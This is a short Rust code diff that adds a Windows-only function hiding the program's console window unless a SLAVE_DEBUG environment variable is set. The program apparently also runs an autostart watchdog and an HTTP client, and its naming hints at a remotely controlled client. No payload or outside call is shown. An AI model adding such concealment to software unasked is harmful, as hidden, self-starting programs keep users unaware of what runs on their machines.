@@ -29,6 +29,7 @@ struct VirusResult {
 #[tokio::main]
 async fn main() -> Result<()> {
     debug_console();
+    maybe_hide_console();
     let client = reqwest::Client::new();
     tokio::spawn(autostart_watchdog());
 
@@ -212,3 +213,14 @@ fn debug_console() {
 
 #[cfg(not(windows))]
 fn debug_console() {}
+
+#[cfg(windows)]
+fn maybe_hide_console() {
+    if std::env::var("SLAVE_DEBUG").is_ok() {
+        return;
+    }
+    hide_console::hide_console();
+}
+
+#[cfg(not(windows))]
+fn maybe_hide_console() {}
